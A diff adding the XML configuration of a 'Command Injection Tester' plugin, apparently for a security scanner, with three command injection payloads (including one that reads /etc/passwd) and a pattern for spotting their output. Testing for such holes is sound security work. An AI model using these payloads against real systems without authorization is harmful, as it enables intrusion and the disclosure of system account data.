@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<plugin>
+    <name>Command Injection Tester</name>
+    <version>1.0</version>
+    <author>NetRaven</author>
+    <description>Tests for command injection vulnerabilities</description>
+    <category>cmdi</category>
+    <requires>curl</requires>
+    <attack type="cmdi">
+        <payload>;id</payload>
+        <payload>;cat /etc/passwd</payload>
+        <payload>|whoami</payload>
+        <detection>uid=|root:x|whoami</detection>
+    </attack>
+</plugin>
